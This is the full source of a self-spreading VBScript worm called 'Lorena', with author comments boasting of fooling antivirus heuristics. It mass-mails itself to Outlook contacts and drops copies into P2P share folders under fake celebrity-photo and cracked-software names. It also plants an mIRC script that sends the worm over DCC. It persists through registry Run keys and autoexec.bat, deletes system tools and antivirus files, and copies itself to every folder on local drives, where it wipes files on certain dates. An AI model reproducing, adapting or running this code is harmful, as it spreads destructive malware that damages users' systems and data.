ON ERROR Resume Next
Randomize
Rem LOrena 
Rem Created by Falckon for the world
Rem Start of this project:Sep 12
Rem is very  easy to deceive the antivirus  heuristic jejeje xD
Dim HUBH, EOJC, OBSO, KGHC, ANAN, COVR, KSUH, SCJK
Dim ULAE, IPBK, RCFQ, GOAS, ELMQ, BMPV, RIKD, BFGR, BQIC, ULAE0, ULAE1, ILIPBK, ILRCFQ, ILGOAS, ILELMQ, ILBMPV, ILRIKD, EHRD
CJKQ = "Wsc"
HCIG = "ript.She"
DTVA = "ll"
FRTU = "Scr"
PHNO = "ipting.FileSys"
JNQQ = "temObject"
SCJK = Chr(83) + Chr(99) + Chr(114) + Chr(105) + Chr(112) + Chr(116)
EOJC = Chr(118) + Chr(66) + Chr(83)
ANAN = Chr(110) + Chr(48) + Chr(61) + Chr(111) + Chr(110) + Chr(32) + Chr(49) + Chr(58) + Chr(74) + Chr(79) + Chr(73) + Chr(78) + Chr(58)
KSUH = Chr(105) + Chr(102) + Chr(32) + Chr(40) + Chr(32) + Chr(36) + Chr(109) + Chr(101) + Chr(32)
COVR = Chr(32) + Chr(36) + Chr(110) + Chr(105) + Chr(99) + Chr(107) + Chr(32) + Chr(41) + Chr(32) + Chr(123) + Chr(32)
Set HUBH = CreateObject(CJKQ + HCIG + DTVA)
Set OBSO = CreateObject(FRTU + PHNO + JNQQ)
IJLA = OBSO.OpenTextFile(Wscript.Scriptfullname, 1).ReadAll
TDSL = Array("GTFG", "IJLA", "TDSL", "TDSLC", "CJKQ", "HCIG", "DTVA", "PHNO", "JNQQ", "EFTI", "HUBH", "EOJC", "OBSO", "KGHC", "ANAN", "COVR", "KSUH", "SCJK", "ULAE", "IPBK", "RCFQ", "GOAS", "ELMQ", "BMPV", "RIKD", "BFGR", "BQIC", "ULAE0", "ULAE1", "ILIPBK", "ILRCFQ", "ILGOAS", "ILELMQ", "ILBMPV", "EHRD", "PUAT", "LNQN", "NUGJ", "FEAS", "GICH", "BLEL", "CNPF", "ODTI", "NNNB", "UMDK", "UKEF", "ULFT", "HRBN", "SOQD", "QHLK", "SUHQ", "FIEM", "NBEN", "MGLE", "LENN", "LVBV", "LFFB", "OLHB", "FJRH", "LLUU", "UTMB", "JOHR", "LVSB", "SDGV", "LAHI", "QJFL", "EKUD", "ILRIKD", "FRTU", "KTTL", "GPMF", "COTD", "GQRB", "TGJJ", "DRJF", "MBIJ", "BNSE", "LFFV", "FCJF", "GPVA", "FGDD", "BKBF", "KFSO", "DAIN")
For TDSLC = 0 To 84
IJLA = Replace(IJLA, TDSL(TDSLC), Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)))
Next
OBSO.OpenTextFile(Wscript.Scriptfullname, 2, 1).Writeline IJLA
Msgbox "I Love You Lorena!!!!!!!",16,"I love you"
Randomize
NUGJ = Int(Rnd * 5)
If NUGJ = "0" Then FEAS = "hi check these super photos"
If NUGJ = "1" Then FEAS = "check my exciting photos"
If NUGJ = "2" Then FEAS = "look these exciting photos"
If NUGJ = "3" Then FEAS = "Please check my  photos in beach"
If NUGJ = "4" Then FEAS = "Sensual photos single for you "
Randomize
GQRB = Int(Rnd * 4)
If GQRB = "0" Then TGJJ = "GIF."
If GQRB = "1" Then TGJJ = "JPG."
If GQRB = "2" Then TGJJ = "JPEG." ' 
If GQRB = "3" Then TGJJ = "PNG."
Randomize
GICH = Int(Rnd * 12)
If GICH = "0" Then BLEL = "Kournikova-Sexy."
If GICH = "1" Then BLEL = "LaraCroft-Naked."
If GICH = "2" Then BLEL = "Shakira-Naked."
If GICH = "3" Then BLEL = "Britney Spears."
If GICH = "4" Then BLEL = "Pink."
If GICH = "5" Then BLEL = "Alissa_Milano-Naked."
If GICH = "6" Then BLEL = "GalileaMontijo."
If GICH = "7" Then BLEL = "LorenaHerrera."
If GICH = "8" Then BLEL = "Naked_Photo"
If GICH = "9" Then BLEL = "MyPhoto."
If GICH = "10" Then BLEL = "Foryou_NakedPhoto."
If GICH = "11" Then BLEL = "OH_OH_SEX_PHOTO_in_BEACH."
EFTI = OBSO.GetSpecialFolder(0)
OBSO.CopyFile  Wscript.ScriptFullname, EFTI & "\System 32\" & BLEL &  TGJJ & EOJC
OBSO.CreateFolder (EFTI & "\System 32")
OBSO.CopyFile Wscript.Scriptfullname, "C:\play." & EOJC
HUBH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\System",EFTI&"\System 32\" & BLEL & TGJJ & EOJC
Dim LNQN
Randomize
PUAT = Int(Rnd * 4)
If PUAT = "0" Then LNQN = "Re:"
If PUAT = "1" Then LNQN = "Exciting Photos"
If PUAT = "2" Then LNQN = "Photos XXX"
If PUAT = "3" Then LNQN = "Sensual photos"
Set CNPF = OBSO.CreateTextFile("C:\send.vbs", True)
CNPF.Writeline "On Error Resume Next"
CNPF.Writeline "Dim ULFT,HRBN,SOQD,QHLK,SUHQ,FIEM"
CNPF.Writeline "ULFT = " & Chr(34) & "Out" & Chr(34)
CNPF.Writeline "HRBN = " & Chr(34) & "look." & Chr(34)
CNPF.Writeline "SOQD = " & Chr(34) & "Appli" & Chr(34)
CNPF.Writeline "QHLK = " & Chr(34) & "cation" & Chr(34)
CNPF.Writeline "SUHQ = " & Chr(34) & "Ma" & Chr(34)
CNPF.Writeline "FIEM = " & Chr(34) & "PI" & Chr(34)
CNPF.Writeline "Set LENN = CreateObject(ULFT+HRBN+SOQD+QHLK)"
CNPF.Writeline "If LENN <> " & Chr(34) & Chr(34) & " Then"
CNPF.Writeline "Set  UKEF = LENN.GetNameSpace(SUHQ+FIEM)"
CNPF.Writeline "For ODTIx = 1 to UKEF.AddressLists.Count"
CNPF.Writeline "Set NNNB = LENN.CreateItem(0)"
CNPF.Writeline "Set UMDK = UKEF.AddressLists.Item(ODTIx)"
CNPF.WriteLine "NNNB.Attachments.Add " & Chr(34) & EFTI&"\System 32\" & BLEL & TGJJ& EOJC & Chr(34)
CNPF.Writeline "NNNB.Subject = " & Chr(34) & LNQN & Chr(34)
CNPF.Writeline "NNNB.Body = " & Chr(34) & FEAS & Chr(34)
CNPF.Writeline "Set MGLE = UMDK.AddressEntries"
CNPF.Writeline "Set recipientis = NNNB.Recipients"
CNPF.Writeline "For NBEN = 1 to MGLE.Count"
CNPF.Writeline "NNNB.Recipients.Add MGLE.Item(NBEN)"
CNPF.Writeline "Next"
CNPF.Writeline "NNNB.Send"
CNPF.Writeline "Next"
CNPF.Writeline "End If"
CNPF.Close
HUBH.run ("C:\send.vbs")
OBSO.CopyFile Wscript.Scriptfullname, EFTI & "\NT." & TGJJ & EOJC
Set LVBV = OBSO.OpenTextFile(Wscript.Scriptfullname, 1)
KGHC = LVBV.ReadAll
HUBH.regwrite "HKCU\Software\Kazaa\LocalContent\Dir0", "012345:" & EFTI & "\System 32"
HUBH.regwrite "HKCU\Software\Kazaa\LocalContent\DisableSharing", 0, "REG_DWORD"
HUBH.regwrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\wallpaper.HTM"
Set LFFB = OBSO.CreateTextFile("C:\wallpaper.HTM", True)
LFFB.Writeline "<" & "HTML><" & "HEAD><" & "Title>...=>>=)?><" & "/Title><" & "/HEAD><" & "Body bgcolor='Black'><" & "p align='center'><" & "font face='Verdana,Arial' size='6' color='red'>i love you lorena!! <" & "/font></p><" & "script language='VBScript'>": Rem Create by nocklaF
LFFB.WriteBlankLines 80
LFFB.Writeline "" & KGHC
LFFB.Writeline "<" & "/script><" & "/Body><" & "/HTML>"
LFFB.Close
DIm Lorena 
OBSO.DeleteFile (OBSO.GETSPECIALFOLDER(1) &"\Msconfig.exe")
OBSO.DeleteFile (OBSO.GETSPECIALFOLDER(1) &"\Sysedit.exe")
HUBH.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WINFT", EFTI & "\NT." & TGJJ & EOJC
HUBH.regwrite "HKLM\Software\KasperskyLab\SharedFiles\Folder", EFTI & "\System 32"
OBSO.DeleteFile (OBSO.GETSPECIALFOLDER(1) &"\Sfc.exe")
OBSO.DeleteFile (OBSO.GETSPECIALFOLDER(0) &"\Regedit.exe")
OBSO.DeleteFile (OBSO.GETSPECIALFOLDER(1) & "\Regedt32.exe ")
EHRD = HUBH.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
Dim FJRH, OLHB, BNSE, LFFV, FCJF, DAIN
FJRH = EHRD & "\KaZaA\My Shared Folder\"
OLHB = EHRD & "\ICQ\shared files\"
BNSE = EHRD & "\eDonkey2000\incoming\"
LFFV = EHRD & "\bearshare\shared\"
FCJF = EHRD & "\Grokster\My Grokster\"
DAIN = EHRD & "\Morpheus\My Shared Folder\"
For LLUU = 1 To 73
If LLUU = 1 Then UTMB = "Las Ketchup XXX."
If LLUU = 2 Then UTMB = "Skin Pokemon KAZAa."
If LLUU = 3 Then UTMB = "Winamp 8.0."
If LLUU = 4 Then UTMB = "Windows Media Player 7.0."
If LLUU = 5 Then UTMB = "Salma Hayek Naked."
If LLUU = 6 Then UTMB = "Britney Spears All BOdy."
If LLUU = 7 Then UTMB = "Xbox Preview."
If LLUU = 8 Then UTMB = "Divx."
If LLUU = 9 Then UTMB = "Real Player 8 Basic."
If LLUU = 10 Then UTMB = "Paint Shop Pro Aniversary + Crack."
If LLUU = 11 Then UTMB = "Microsoft Windows XP Pro FUll."
If LLUU = 12 Then UTMB = "BritneySpears.mpg."
If LLUU = 13 Then UTMB = "Shakira."
If LLUU = 14 Then UTMB = "StarCraft."
If LLUU = 15 Then UTMB = "AVPCrack.exe."
If LLUU = 16 Then UTMB = "ICQ 2002."
If LLUU = 17 Then UTMB = "Diablo Installer."
If LLUU = 18 Then UTMB = "Norton Antivirus 2003."
If LLUU = 19 Then UTMB = "Panda_Titanium_Crack."
If LLUU = 20 Then UTMB = "Galilea Montijo BBvip."
If LLUU = 21 Then UTMB = "Sexo."
If LLUU = 22 Then UTMB = "Age of Mythology Full."
If LLUU = 23 Then UTMB = "WarCraft 3 Full."
If LLUU = 24 Then UTMB = "Kazaa Lite."
If LLUU = 25 Then UTMB = "kazaa."
If LLUU = 26 Then UTMB = "Morpheus."
If LLUU = 27 Then UTMB = "Morpheus."
If LLUU = 28 Then UTMB = "AudioGalaxy."
If LLUU = 29 Then UTMB = "StarCraft Installer."
If LLUU = 30 Then UTMB = "Visual_basic_6.exe."
If LLUU = 31 Then UTMB = "Visual Basic 6 Enterprise Edition."
If LLUU = 32 Then UTMB = "Fire Works MX."
If LLUU = 33 Then UTMB = "Shakira ALL Body."
If LLUU = 34 Then UTMB = "Shakira nAKED."
If LLUU = 35 Then UTMB = "Cristina Aguilera Porn Photo.gif."
If LLUU = 36 Then UTMB = "Pamela Anderson Sex.jpg."
If LLUU = 37 Then UTMB = "mIRC."
If LLUU = 38 Then UTMB = "Lyrics."
If LLUU = 39 Then UTMB = "Galilea Montijo Sexy Bikini."
If LLUU = 40 Then UTMB = "Alyssa Milano all body ."
If LLUU = 41 Then UTMB = "Microsoft Encarta 2002."
If LLUU = 42 Then UTMB = "Zone Alarm 2."
If LLUU = 43 Then UTMB = "Galilea Montijo en Chichis (1)."
If LLUU = 44 Then UTMB = "Thalia Sex BEACH."
If LLUU = 45 Then UTMB = "Skin kazaa."
If LLUU = 46 Then UTMB = "Antivirus Cracks."
If LLUU = 47 Then UTMB = "Fire Works MX."
If LLUU = 48 Then UTMB = "Shakira-Naked."
If LLUU = 49 Then UTMB = "Shakira sexy bikini."
If LLUU = 50 Then UTMB = "Neo Genesis Evangelion.jpg."
If LLUU = 51 Then UTMB = "WinZip 8.1 + Crack."
If LLUU = 52 Then UTMB = "Eightball."
If LLUU = 53 Then UTMB = "Delphi 7 Enterprise + Crack."
If LLUU = 54 Then UTMB = "Galilea Montijo (3)."
If LLUU = 55 Then UTMB = "Surrender - Laura Pausini."      
If LLUU = 56 Then UTMB = "Eternamente(Remix)."
If LLUU = 57 Then UTMB = "IP-TOOLS."
If LLUU = 58 Then UTMB = "Adove Acrobat Reader 5."
If LLUU = 59 Then UTMB = "Macromedia Flash 5." 
If LLUU = 60 Then UTMB = "Macromedia Fire Works MX."      
If LLUU = 61 Then UTMB = "Tony Hawk's Pro Skater 2 ."
If LLUU = 62 Then UTMB = "WS_FTP LE (32-bit)."
If LLUU = 63 Then UTMB = "Download Accelerator Plus ."
If LLUU = 64 Then UTMB = "ICQ Pro 2003a beta ."
If LLUU = 65 Then UTMB = "Ad-aware ."      
If LLUU = 66 Then UTMB = "MSN Messenger."
If LLUU = 67 Then UTMB = "Grokster ."
If LLUU = 68 Then UTMB = "WinRAR."
If LLUU = 69 Then UTMB = "DivX Video Bundle ." 
If LLUU = 70 Then UTMB = "AOL Instant Messenger (32-bit)."      
If LLUU = 71 Then UTMB = "WindowBlinds."
If LLUU = 72 Then UTMB = "WinMX ."
If LLUU = 73 Then UTMB = "Nero Burning ROM."
OBSO.CopyFile Wscript.Scriptfullname, EFTI & "\System 32\" & UTMB  & EOJC
If OBSO.FolderExists(FJRH) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & FJRH & UTMB & EOJC
If OBSO.FolderExists(OLHB) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & OLHB & UTMB & EOJC
If OBSO.FolderExists(BNSE) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & BNSE & UTMB & EOJC
If OBSO.FolderExists(LFFV) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & LFFV & UTMB & EOJC
If OBSO.FolderExists(FCJF) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & FCJF & UTMB & EOJC
If OBSO.FolderExists(DAIN) = True Then OBSO.CopyFile Wscript.Scriptfullname, "" & DAIN & UTMB & EOJC
Next
If QJFL = "" Then
If OBSO.fileExists("C:\mIRC\MIRC.INI") Then QJFL = "C:\mIRC"
If OBSO.fileExists("C:\mIRC32\MIRC.INI") Then QJFL = "C:\mIRC32"
If OBSO.fileExists(EHRD & "\mIRC\mirc.ini") Then QJFL = EHRD & "\mIRC"
End If
If QJFL <> "" Then
Set LAHI = OBSO.CreateTextFile(QJFL & "\script.ini", True)
LAHI.Writeline "[" & SCJK & "]"
LAHI.Writeline "" & ANAN & "#:" & KSUH & "!=" & COVR & "/msg" & Chr(32) & Chr(36) & Chr(78) & Chr(105) & Chr(99) & Chr(107) & Chr(32) & FEAS & Chr(32) & Chr(124) & Chr(32) & Chr(47) & Chr(100) & Chr(99) & Chr(99) & Chr(32) & "send" & Chr(32) & Chr(36) & Chr(78) & Chr(73) & Chr(67) & Chr(75) & Chr(32) & EFTI & "\System 32\" & BLEL & TGJJ& EOJC & Chr(32) & Chr(125)
End If
ULAE = EHRD & "\AntiViral Toolkit Pro\"
IPBK = EHRD & "\Command Software\F-PROT95\"
RCFQ = EHRD & "\McAfee\VirusScan\"
GOAS = EHRD & "\Norton AntiVirus\"
ELMQ = "C:\Toolkit\FindVirus\"
BMPV = EHRD & "\Panda Software\Panda Antivirus Titanium\"
RIKD = EHRD & "\Trend Micro\PC-cillin 2002\"
BFGR = EHRD & "\AVPersonal\"
BQIC = EHRD & "\Trend PC-cillin 98\"
ULAE0 = EHRD & "\Perav\"
ULAE1 = EHRD & "\McAfee\McAfee VirusScan\"
ILIPBK = EHRD & "\Panda Software\Panda Antivirus 6.0\"
ILRCFQ = EHRD & "\Trend Micro\PC-cillin 2000\"
ILGOAS = EHRD & "\AnalogX\Script Defender\"
ILELMQ = EHRD & "\F-Secure\Anti-Virus\"
ILBMPV = EHRD & "\Zone Labs\ZoneAlarm\"
ILRIKD = EHRD & "\ESET\NOD32\"
If OBSO.FolderExists(ULAE) = True Then OBSO.DeleteFile (ULAE & "*.*")
If OBSO.FolderExists(IPBK) = True Then OBSO.DeleteFile (IPBK & "*.*")
If OBSO.FolderExists(RCFQ) = True Then OBSO.DeleteFile (RCFQ & "*.*")
If OBSO.FolderExists(GOAS) = True Then OBSO.DeleteFile (GOAS & "*.*")
If OBSO.FolderExists(ELMQ) = True Then OBSO.DeleteFile (ELMQ & "*.*")
If OBSO.FolderExists(BMPV) = True Then OBSO.DeleteFile (BMPV & "*.*")
If OBSO.FolderExists(RIKD) = True Then OBSO.DeleteFile (RIKD & "*.*")
If OBSO.FolderExists(BFGR) = True Then OBSO.DeleteFile (BFGR & "*.*")
If OBSO.FolderExists(BQIC) = True Then OBSO.DeleteFile (BQIC & "*.*")
If OBSO.FolderExists(ULAE0) = True Then OBSO.DeleteFile (ULAE0 & "*.*")
If OBSO.FolderExists(ULAE1) = True Then OBSO.DeleteFile (ULAE1 & "*.*")
If OBSO.FolderExists(ILIPBK) = True Then OBSO.DeleteFile (ILIPBK & "*.*")
If OBSO.FolderExists(ILRCFQ) = True Then OBSO.DeleteFile (ILRCFQ & "*.*")
If OBSO.FolderExists(ILGOAS) = True Then OBSO.DeleteFile (ILGOAS & "*.*")
If OBSO.FolderExists(ILELMQ) = True Then OBSO.DeleteFile (ILELMQ & "*.*")
If OBSO.FolderExists(ILBMPV) = True Then OBSO.DeleteFile (ILBMPV & "*.*")
If OBSO.FolderExists(ILRIKD) = True Then OBSO.DeleteFile (ILRIKD & "*.*")
Set MBIJ = OBSO.CreateTextFile("C:\porque.txt")
MBIJ.WriteLine "Lorena te amo"
MBIJ.WriteLine "yo te QUIERO Y TU LO SABES BIEN"
MBIJ.WriteLine "Nos conocimos hace exactamente 2 años"
MBIJ.WriteLine "y esto es dedicado a ti"
MBIJ.WriteLine "CON TODO MI AMOR Y CARIÑO"
MBIJ.close
HUBH.RUN("C:\porque.txt")
Set BKBF = OBSO.CreatetextFile("C:\Autoexec.bat", True)
BKBF.WriteLine "@Echo off"
BKBF.Writeline "Start C:\play.vbs>null"
BKBF.close
For Each DRJF In OBSO.Drives
If DRJF.DriveType = 2 Or DRJF.DriveType = 3 Then
Searching(DRJF.Path&"\")
End If:Next
Sub Searching(fspec)
On Error Resume Next
Set KTTL = OBSO.GetFolder(fspec)
For Each GPMF In KTTL.SubFolders
OBSO.Copyfile Wscript.ScriptFullname, GPMF.Path + "\Lorena-te-amo.vbs"
KFSO = CInt(Month(Date) + Day(Date))
If KFSO = 10 Then
OBSO.DeleteFile  GPMF.Path + "\*.*"
end if
Next
For Each COTD In KTTL.SubFolders
Searching(COTD.Path):Next
End Sub
Rem Terminated: NOV 21
Rem  new projects: LRNA (Delphi,vbs(terminated)), Falckon Infector Floppy disks (Visual Basic 6(terminated)) and VIH(vbs)
Rem It looks like the world for my new projects  ;-) jejejejejeje
Rem  they remember my carmina, Legion and my other stupid creations?
Rem my Talorm (Thalia) is a shit..  
Rem Dedicated to  (Lorena Magali) and txTerminatrix,
Rem I love  you! PHP,HTML,DELPHI,VBS AND VB
Rem http://www.geocities.com/zonavirus/colaborar.html#falckon <-- hey kuasanagui! kita eso de borland no existe! we!!! y mi nick es falckon no falckon hacker y mi cumple ya pas0.. mi mail fue hack  por un chileno quitalo..
Rem i learn C++ 






